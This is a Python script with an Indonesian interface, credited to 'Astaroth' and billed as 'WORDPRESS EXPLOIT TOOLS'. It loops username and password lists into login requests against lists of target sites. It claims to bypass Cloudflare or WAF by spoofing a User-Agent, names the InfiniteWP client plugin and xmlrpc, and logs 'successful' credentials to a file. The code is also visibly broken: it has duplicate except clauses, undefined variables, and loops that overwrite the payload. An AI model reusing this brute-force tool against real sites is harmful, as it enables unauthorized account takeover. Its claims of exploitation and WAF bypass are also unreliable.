import requests
import http.client
import json
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from itertools import product
from string import ascii_lowercase, digits
import colorama
fr  =   colorama.Fore.RED
fg  =   colorama.Fore.GREEN

banner = '''{}
		   
[#] Dibuat Oleh ::
Astaroth    
          ############## WORDPRESS EXPLOIT TOOLS ##############                                                                     		 
	    Telegram => https://t.me/astaroth404forbidden
        \n'''.format(fg)
print(banner)
requests.urllib3.disable_warnings()

def exploit_website(url, payload, exploit_type=None, method='post'):
    try:
        conn = http.client.HTTPSConnection(url)
        headers = {'Content-type': 'application/x-www-form-urlencoded'}
        conn.request(method, '', payload, headers)
        response = conn.getresponse()
        data = response.read().decode('utf-8')
        data = json.loads(data)

        if response.status == 200:
            if "Invalid username" in data or "The password you entered for the username" in data:
                print("Username atau password tidak valid.")
            else:
                print("Selamat kamu berhasil Exploit!")
                print("Response:")
                print("Original script by Astaroth")
                with open('berhasil.txt', 'a', encoding='utf-8') as file:
                    file.write(f"URL: {url}\n")
        else:
            print("Exploit failed. Status Code:", response.status)
    except Exception as e:
        print("An error occurred:", e)
        exploit_type = exploit_type  # Use the exploit_type passed as an argument
        if exploit_type == 'infinitewp-client-1.9.4.5':
            if method == 'post':
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
                }
                cookies = {
                    'session': '123456'
                }
                response = requests.post(url, data=payload, headers=headers, cookies=cookies)
            elif method == 'get':
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
                }
                cookies = {
                    'session': '123456'
                }
                response = requests.get(url, params=payload, headers=headers, cookies=cookies)
            if response.status_code == 200:
                print("Selamat kamu berhasil Exploit!")
                print("Response:")
                print("Original script by Astaroth")
                with open('berhasil.txt', 'a', encoding='utf-8') as file:
                    file.write(f"URL: {url}\n")
            else:
                print("Exploit failed. Status Code:", response.status_code)
        else:
            if method == 'post':
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
                }
                cookies = {
                    'session': '123456'
                }
                response = requests.post(url, data=payload, headers=headers, cookies=cookies)
            elif method == 'get':
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
                }
                cookies = {
                    'session': '123456'
                }
                response = requests.get(url, params=payload, headers=headers, cookies=cookies)
        if response.status_code == 200:
            print("Selamat kamu berhasil Exploit!")
            print("Response:")
            print("Original script by Astaroth")
        else:
            print("Exploit failed. Status Code:", response.status_code)
    except Exception as e:
        print("An error occurred:", e)

        try:
            with open('url.txt', 'r', encoding='utf-8') as file:
                url = file.read().replace('\n', '')
        except FileNotFoundError:
            print("File url.txt tidak ditemukan. Silakan buat file tersebut dan masukkan URL website.")
            exit()

        try:
            with open('user.txt', 'r') as file:
                usernames = file.read().splitlines()
        except FileNotFoundError:
            print("File user.txt tidak ditemukan. Silakan buat file tersebut dan masukkan username.")
            exit()

        try:
            with open('password.txt', 'r') as file:
                passwords = file.read().splitlines()
        except FileNotFoundError:
            print("File password.txt tidak ditemukan. Silakan buat file tersebut dan masukkan password.")
            exit()

        for username in usernames:
            for password in passwords:
                payload = {
                    "username": username,
                    "password": password,
                    "submit": "login"
                }

try:
    exploit_website(url, payload, exploit_type='xmlrpc', method='post')
except NameError:
    pass

def menu():
    print("WORDPRESS EXPLOIT TOOLS")
    print("Original script by Astaroth")
    print("Silakan pilih menu:")
    print("1. Exploit Website")
    print("2. Keluar")

if __name__ == "__main__":
    menu()
    choice = int(input("Pilihan: "))
    if choice == 1:
        try:
            exploit_website(url, payload, exploit_type='xmlrpc', method='post')
        except NameError:
            print("URL tidak ditemukan. Silakan masukkan URL website.")
    elif choice == 2:
        print("Terima kasih telah menggunakan AUTO EXPLOIT.")
    else:
        print("Pilihan tidak valid. Silakan coba lagi.")

    try:
        with open('url.txt', 'r', encoding='utf-8') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith('http://') and not url.startswith('https://'):
                    print("URL tidak valid. Harap masukkan URL yang dimulai dengan 'http://' atau 'https://'.")
                    exit()
    except FileNotFoundError:
        print("File url.txt tidak ditemukan. Silakan buat file tersebut dan masukkan URL website.")
        exit()
        
    if choice == 1:
        print("Silakan pilih file .txt untuk URL:")
        url_file = input()
        with open(url_file, 'r', encoding='utf-8') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith('http://') and not url.startswith('https://'):
                    print("URL tidak valid. Harap masukkan URL yang dimulai dengan 'http://' atau 'https://'.")
                    exit()
        print("Silakan pilih file .txt untuk username:")
        username_file = input()
        with open(username_file, 'r') as file:
            usernames = file.read().splitlines()
        print("Silakan pilih file .txt untuk password:")
        password_file = input()
        with open(password_file, 'r') as file:
            passwords = file.read().splitlines()
        for username in usernames:
            for password in passwords:
                payload = {
                    "username": username,
                    "password": password,
                    "submit": "login"
                }
        # Bypass Cloudflare or WAF
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        }
        response = requests.post(url, data=payload, headers=headers)
        if response.status_code == 200:
            print("Berhasil bypass Cloudflare atau WAF.")
        else:
            print("Gagal bypass Cloudflare atau WAF.")
        for url in urls:
            exploit_website(url, payload, exploit_type='xmlrpc', method='post')

        try:
            with open('berhasil.txt', 'a', encoding='utf-8') as file:
                file.write(f"URL: {url} | Username: {username} | Password: {password}\n")
        except:
            with open('gagal.txt', 'a', 'utf-8') as file:
                file.write(f"Gagal diexploit: {url}\n")
